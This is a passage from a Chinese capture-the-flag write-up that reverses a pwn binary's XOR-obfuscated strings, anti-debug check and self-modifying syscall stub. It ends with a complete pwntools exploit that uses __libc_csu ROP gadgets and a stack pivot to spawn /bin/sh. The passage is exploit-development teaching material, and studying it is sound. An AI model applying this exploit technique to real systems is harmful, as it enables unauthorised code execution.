  buf2[2] = 64;
  buf2[3] = 66;
  buf2[4] = 68;
  buf2[5] = 83;
  buf2[6] = 113;
  buf2[7] = 72;
  buf2[8] = 69;
  for (int j = 0; j <= 8; ++j )
    buf2[j] ^= 0x21u;
  buf3[0] = 94;
  buf3[1] = 67;
  buf3[2] = 93;
  buf3[3] = 95;
  buf3[4] = 68;
  buf3[5] = 67;
  buf3[6] = 89;
  buf3[7] = 75;
  for (int k = 0; k <= 7; ++k )
    buf3[k] ^= 0x2Du;
  buf4[0] = 81;
  buf4[1] = 83;
  buf4[2] = 66;
  buf4[3] = 70;
  buf4[4] = 95;
  buf4[5] = 82;
  for (int l = 0; l <= 5; ++l )
    buf4[l] ^= 0x36u;
  buf5[0] = 36;
  buf5[1] = 45;
  buf5[2] = 50;
  buf5[3] = 39;
  buf5[4] = 44;
  for (int m = 0; m <= 4; ++m )
    buf5[m] ^= 0x42u;
  buf6[0] = 93;
  buf6[1] = 92;
  buf6[2] = 94;
  buf6[3] = 79;
  buf6[4] = 72;
  for (int n = 0; n <= 4; ++n )
    buf6[n] ^= 0x3Bu;
  buf7[0] = 60;
  buf7[1] = 59;
  buf7[2] = 61;
  buf7[3] = 60;
  buf7[4] = 59;
  buf7[5] = 61;
  for (int ii = 0; ii <= 5; ++ii )
    buf7[ii] ^= 0x4Fu;
  buf8[0] = 57;
  buf8[1] = 44;
  buf8[2] = 55;
  buf8[3] = 49;
  for (int jj = 0; jj <= 3; ++jj )
    buf8[jj] ^= 0x58u;
  buf9[0] = 4;
  buf9[1] = 1;
  buf9[2] = 14;
  buf9[3] = 13;
  buf9[4] = 17;
  buf9[5] = 7;
  for (int kk = 0; kk <= 5; ++kk )
    buf9[kk] ^= 0x62u;
  for ( i = 0; i <= 8; ++i )
    file[i] ^= 0x37u;
  char what[8];
  what[0] = 113;
  what[1] = 108;
  what[2] = 110;
  what[3] = 115;
  what[4] = 104;
  what[5] = 121;
  what[6] = 127;
  what[7] = 104;
  for (int i = 0; i <= 7; ++i )
    what[i] ^= 0x1Cu;

  for(int xx = 0; xx <= 22; ++xx){
	res[xx]  = wz[xx] ^ hh[xx];
    //printf("%p, ",res[xx] & 0xff);
  }
  printf("file:%s\n",file);
  printf("buf1:%s\n",buf1);
  printf("buf2:%s\n",buf2);
  printf("buf3:%s\n",buf3);
  printf("buf4:%s\n",buf4);
  printf("buf5:%s\n",buf5);
  printf("buf6:%s\n",buf6);
  printf("buf7:%s\n",buf7);
  printf("buf8:%s\n",buf8);
  printf("buf9:%s\n",buf9);
  printf("what:%s\n",what);

}
```

当进程被调试时，其会在/proc/self/status里增加一个调试进程的pid，赋给TracePid，该函数在这个文件中查找该字段，如果发现就将pid返回给上层函数，否则返回0.

![](./2.png)

继续看，如果没有调试器，result为1，则调用AutoChange函数。

首先调用mprotect将代码段加上可执行权限，之后使用异或的方式循环修改位于`0x4017CD`的汇编代码，我们还是写个c来解码(这部分在上面的test.c里)，之后把修改的字节码反汇编一下。

```c
unsigned __int64 __fastcall AutoChange(void **a1)
{
  signed int i; // [rsp+10h] [rbp-40h]
  signed int j; // [rsp+14h] [rbp-3Ch]
  void (__fastcall *mprotect_)(_QWORD, signed __int64, signed __int64); // [rsp+18h] [rbp-38h]
  char what[8]; // [rsp+20h] [rbp-30h]
  char v6; // [rsp+28h] [rbp-28h]
  char hh[23]; // [rsp+30h] [rbp-20h]
  unsigned __int64 v8; // [rsp+48h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  hh[0] = -63;
  hh[1] = -12;
  hh[2] = 4;
  hh[3] = -63;
  hh[4] = -4;
  hh[5] = 15;
  hh[6] = -63;
  hh[7] = -36;
  hh[8] = 34;
  hh[9] = -63;
  hh[10] = -60;
  hh[11] = 58;
  hh[12] = 8;
  hh[13] = 0;
  hh[14] = -124;
  hh[15] = -29;
  hh[16] = -114;
  hh[17] = -116;
  hh[18] = 59;
  hh[19] = -47;
  hh[20] = -58;
  hh[21] = -76;
  hh[22] = 55;
  what[0] = 113;
  what[1] = 108;
  what[2] = 110;
  what[3] = 115;
  what[4] = 104;
  what[5] = 121;
  what[6] = 127;
  what[7] = 104;
  v6 = 0;
  for ( i = 0; i <= 7; ++i )
    what[i] ^= 0x1Cu;
  mprotect_ = (void (__fastcall *)(_QWORD, signed __int64, signed __int64))CallLibFunc(a1, what);
  mprotect_((unsigned int)Syscall & 0xFFFFF000, 4096LL, 7LL);
  for ( j = 0; j <= 22; ++j )
    *((_BYTE *)Syscall + j + 4) = *((_BYTE *)&wz + j) ^ hh[j];
  mprotect_((unsigned int)Syscall & 0xFFFFF000, 4096LL, 5LL);
  return __readfsqword(0x28u) ^ v8;
}
```
反汇编脚本
```py
#coding=utf-8
from pwn import *
context.arch='amd64'
context.os='linux'

c = [0x48, 0x89, 0xf8, 0x48, 0x89, 0xf7, 0x48, 0x89, 0xd6, 0x48, 0x89, 0xca, 0x4c, 0x89, 0xc1, 0xf, 0x5, 0xc9, 0xc3, 0x48, 0x31, 0xc9, 0xc3]

code = ''.join(chr(item) for item in c)

print disasm(code)
```
最终可以得到这部分修改的汇编，即修改为了syscall函数。我们使用Keypatch将这部分汇编patch过去，并且nop掉AutoChange函数。

```bash
╭─wz@wz-virtual-machine ~/Desktop/CTF/kctf_q3 ‹hexo*› 
╰─$ python test.py 
   0:   48 89 f8                mov    rax,rdi
   3:   48 89 f7                mov    rdi,rsi
   6:   48 89 d6                mov    rsi,rdx
   9:   48 89 ca                mov    rdx,rcx
   c:   4c 89 c1                mov    rcx,r8
   f:   0f 05                   syscall 
  11:   c9                      leave  
  12:   c3                      ret    
  13:   48 31 c9                xor    rcx,rcx
  16:   c3                      ret

```

patch之后的位置成了一个新的函数.

```c
__int64 __fastcall Syscall(__int64 num, int arg1, int arg2, int arg3)
{
  __int64 result; // rax

  result = num;
  __asm { syscall; Keypatch modified this from: }
  return result;
}
```

到了这里我们再重新看main函数。input函数向bss段写入了0x200的字节

```c
__int64 __fastcall get_input(__int64 a1)
{
  int read_num; // edx
  __int64 result; // rax

  *(_QWORD *)a1 = off_401898;
  *(_DWORD *)(a1 + 8) = 0;
  read_num = Syscall(0LL, 0, (unsigned __int64)&bss_input, 0x200);
  result = a1;
  *(_DWORD *)(a1 + 8) = read_num;
  return result;
}
```
Mov函数将输入数据拷贝到栈上，这里存在栈溢出，且调用位于stack_val+0x18的函数指针。
```c
unsigned __int64 __fastcall Mov(unsigned int *stack_val, __int64 input)
{
  char v3; // [rsp+10h] [rbp-70h]
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(&v3, 0, 0x60uLL);
  sub_40177E((__int64)stack_val, (__int64)&v3, input);
  (*(void (__fastcall **)(unsigned int *, char *))(*(_QWORD *)stack_val + 0x18LL))(stack_val, &v3);
  return __readfsqword(0x28u) ^ v4;
}
//
__int64 __fastcall my_copy(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  signed int i; // [rsp+28h] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = *(unsigned int *)(a1 + 8);
    if ( (signed int)result <= i )
      break;
    *(_BYTE *)(a2 + i) = *(_BYTE *)(i + a3);
  }
  return result;
}
```

这里我们只能通过系统调用执行Sys_execve。需要控制rdi,rsi,rdx,rax。通过csu可以控制edi,rsi,rdx，结合syscall的mov可以间接控制rax,rdi,rsi,再加上`xor rcx,rcx; ret` + `mov    rdx,rcx`就可以控制rdx最后执行系统调用get shell。

### exp.py

```py
#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn1')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn1')
else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)


leave = 0x0000000000400bbd
p_rdi = 0x0000000000401863
p_rsi_r = 0x0000000000401861
csu_front = 0x40185A
csu_end = 0x401840
ret = 0x000000000040028c

def csu(rbx,rbp,r12,r13,r14,r15,retn_rbp,rr15,retn_addr):
    #rbx = 0
    #rbp = 1
    #r12 = func
    #r13 = rdx
    #r14 = rsi
    #r15d = edi
    payload = p64(csu_front)
    payload += flat([
        rbx,rbp,r12,r13,r14,r15
        ])
    payload += p64(csu_end)
    payload += "/bin/sh\x00"*2
    payload += p64(retn_rbp)
    payload += "/bin/sh\x00"*3
    payload += p64(rr15)
    payload += p64(retn_addr)
    return payload


def exp():
    #leak libc
    #gdb.attach(p,'b* 0x4016b3')
    sleep(0.01)
    input_addr = 0x6020C0
    sh_addr = 0x602120
    payload = csu(0,1,0x602138,0,sh_addr,0x3b,input_addr+0x80,input_addr-8,ret)
    #payload = payload.ljust(0x70,'a')
    #payload += p64(input_addr+0xa0)
    payload += p64(leave)+p64(0x4017e7)+p64(0x4017d0)
    payload = payload.ljust(0x98,'b')
    payload += p64(leave)
    #payload += "/bin/sh\x00"
    payload += p64(input_addr+0x98-0x18)

    #payload += p64(leave)
    p.send(payload)
    p.interactive()

exp()

```
